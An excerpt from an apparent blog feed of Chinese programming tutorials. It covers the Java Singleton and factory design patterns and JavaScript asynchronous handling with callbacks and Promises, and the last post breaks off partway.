      <link href="/2020/11/13/DesignPattern-Singleton/"/>
      <url>/2020/11/13/DesignPattern-Singleton/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>单例模式是一个比较简单的模式，其目的在于<strong>确保某一个类只有一个实例，并且自行实例化并向整个系统提供这个实例</strong>。一般来说，对于一些创建、销毁比较昂贵的对象实例，也许使用单例模式是一个不错的选择。比如一个始终需要从键盘获取用户输入的系统，我们可以在类似 Utils 的静态类中设置一个全局唯一的Scanner类，始终用于获取用户的输入，从而避免每次创建删除同类对象产生的开销。</p><h1 id="0x1-基本代码"><a href="#0x1-基本代码" class="headerlink" title="0x1 基本代码"></a>0x1 基本代码</h1><p>很多设计模式相关的教程上都将单例模式分为饿汉单例和懒汉单例，它们的基本代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 饿汉单例</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 懒汉单例（线程不安全）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，为了限制客户端对该对象的多次实例化，两者的 constructor 均被设置为 private 可见性，并对外暴露静态方法 getInstance 用于返回内部的实例。区别在于，懒汉单例应用了 lazy loading 的思想，使得 instance 的实例化延迟到 getInstance 方法真正被调用时；而饿汉单例借助了 ClassLoader 的能力，让 instance 的实例化在 Singleton 类被加载时便进行了。</p><h1 id="0x2-懒汉单例与线程安全"><a href="#0x2-懒汉单例与线程安全" class="headerlink" title="0x2 懒汉单例与线程安全"></a>0x2 懒汉单例与线程安全</h1><p>就像上面的注释所言，上述形式的懒汉模式并不是线程安全的，原因在于 <code>instance == null</code> 这句判断在并发的场景下是非常靠不住的，比如如下的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">        Singleton.getInstance();</span><br><span class="line">      &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">private</span> Singleton instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"An instance has been created"</span>);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">      instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> instance;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在笔者的设备上共输出了5次 <code>An instance has been created</code> ，也就是产生了5个不同的对象，这并不符合单例模式。</p><p>针对上述问题，可以通过 synchronized 关键字对代码进行加锁，从而在保证线程安全的条件下实现懒汉单例。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之工厂模式</title>
      <link href="/2020/11/05/DesignPattern-FactoryPattern/"/>
      <url>/2020/11/05/DesignPattern-FactoryPattern/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-简单（静态）工厂模式"><a href="#0x0-简单（静态）工厂模式" class="headerlink" title="0x0 简单（静态）工厂模式"></a>0x0 简单（静态）工厂模式</h1><p>一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。</p><p>但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。</p><p>更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(...)))</span><br></pre></td></tr></table></figure><p>如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。</p><p>简单工厂模式就可以很好地解决上述这些问题。</p><p>要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="comment">// constructor 设置为 private，因为这个工厂内部只需要静态方法即可</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename)));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在要获得 Reader 时，可以写类似 <code>Reader bufferedReader = ReaderFactory.createReaderForFile(...)</code> 的代码，而在日后遇到需要修改为 LineNumberReader 的维护需求时，只需要修改工厂中的代码即可。</p><p>这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReaderFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">ReaderFactory</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Reader <span class="title">createReaderForFile</span><span class="params">(String filename, String readerType)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">    Reader fileReader = <span class="keyword">new</span> FileReader(<span class="keyword">new</span> File(filename));</span><br><span class="line">    <span class="keyword">switch</span> (readerType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"BufferedReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> BufferedReader(fileReader);</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"LineNumberReader"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LineNumberReader(fileReader);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> fileReader;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。</p><p>虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。</p><p>所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。</p><h1 id="0x1-工厂方法模式"><a href="#0x1-工厂方法模式" class="headerlink" title="0x1 工厂方法模式"></a>0x1 工厂方法模式</h1><p>虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。</p><p>工厂方法模式就可以很好地解决上述问题。</p><p>为了举例，假设我们有一个 Pet 的接口，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在分别定义猫和狗实体类来实现该接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"喵"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"汪"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="title">PetFactory</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> Pet DEFAULT_PET = <span class="keyword">new</span> Pet() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      System.out.println(<span class="string">"Idk who am I"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Pet <span class="title">createPet</span><span class="params">(String petType)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (petType) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Cat"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"Dog"</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> DEFAULT_PET;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。</p><p>那么同样的需求，如果用工厂方法模式来实现会是什么样呢？</p><p>首先，需要把 PetFactory 从类转为接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="function">Pet <span class="title">createPet</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后针对 Cat 和 Dog 分别实现其工厂：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CatFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Cat();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DogFactory</span> <span class="keyword">implements</span> <span class="title">PetFactory</span> </span>&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Pet <span class="title">createPet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Dog();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，客户端的代码可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  PetFactory catFactory = <span class="keyword">new</span> CatFactory();</span><br><span class="line">  PetFactory dogFactory = <span class="keyword">new</span> DogFactory();</span><br><span class="line">  catFactory.createPet().say();</span><br><span class="line">  dogFactory.createPet().say();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们<strong>定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类</strong>。</p><p>和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。</p><h1 id="0x2-抽象工厂模式"><a href="#0x2-抽象工厂模式" class="headerlink" title="0x2 抽象工厂模式"></a>0x2 抽象工厂模式</h1><p>抽象工厂模式的定义是<strong>为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类</strong>，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做<strong>产品</strong>，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个<strong>产品族</strong>。</p><p>一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。</p><p>这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CallBack 与 Promise 与 Generator 与 async/await 的故事</title>
      <link href="/2020/09/29/AsyncJavascript/"/>
      <url>/2020/09/29/AsyncJavascript/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/async_function" target="_blank" rel="noopener">文档</a>，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇<a href="http://caibaojian.com/es6/async.html" target="_blank" rel="noopener">文章</a>，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。</p><p>于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。</p><h1 id="0x1-关于-Javascript-的异步"><a href="#0x1-关于-Javascript-的异步" class="headerlink" title="0x1 关于 Javascript 的异步"></a>0x1 关于 Javascript 的异步</h1><p>之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。</p><p>众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。</p><p>事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。</p><h1 id="0x2-关于-CallBack"><a href="#0x2-关于-CallBack" class="headerlink" title="0x2 关于 CallBack"></a>0x2 关于 CallBack</h1><p>CallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。</p><p>回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line">readFile(..., (err, data) =&gt; &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。</p><p>但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 <code>file1 -&gt; file2 -&gt; file3 -&gt; ...</code> 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。</p><p>于是 Promise 出现了。</p><h1 id="0x3-关于-Promise"><a href="#0x3-关于-Promise" class="headerlink" title="0x3 关于 Promise"></a>0x3 关于 Promise</h1><p>Promise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 <a href="https://github.com/ysmood/yaku" target="_blank" rel="noopener">yaku</a> 这个库，贺老曾对此有过很高的评价）。</p><p>这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。</p><p>回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  readFile(<span class="string">'file2'</span>, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    readFile(<span class="string">'file3'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">      readFile(<span class="string">'...'</span>, (err, data) =&gt; &#123;</span><br><span class="line">        ...</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。</p><p>而同样的逻辑，如果用 Promise 写出来是这样的:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line">readFile(<span class="string">'file1'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File1 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file2'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File2 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  <span class="keyword">return</span> readFile(<span class="string">'file3'</span>, &#123; <span class="attr">encoding</span>: <span class="string">'utf8'</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`File3 content: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。</p><h1 id="0x4-更进一步"><a href="#0x4-更进一步" class="headerlink" title="0x4 更进一步"></a>0x4 更进一步</h1><p>虽然 Promise 